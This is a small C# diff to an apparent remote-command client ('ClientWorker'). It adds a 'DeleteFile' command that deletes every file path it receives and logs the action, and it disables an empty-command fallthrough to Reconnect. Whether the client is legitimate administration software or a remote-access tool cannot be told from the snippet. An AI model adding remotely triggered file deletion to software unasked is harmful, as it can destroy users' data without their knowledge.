@@ -70,8 +70,16 @@ namespace ClientWorker
                     Log.Send("SendLogList()");
                     break;
 
+                case "DeleteFile":
+                    foreach (string prm in parametrs)
+                    {
+                        FileManager.DeleteFile(prm);
+                    }
+                    Log.Send("DeleteFiles()");
+                    break;
+
                 case "Reconnect":
-                case "":
+                //case "":
                     Reconnect();
                     Log.Send("Reconnect()");
                     break;
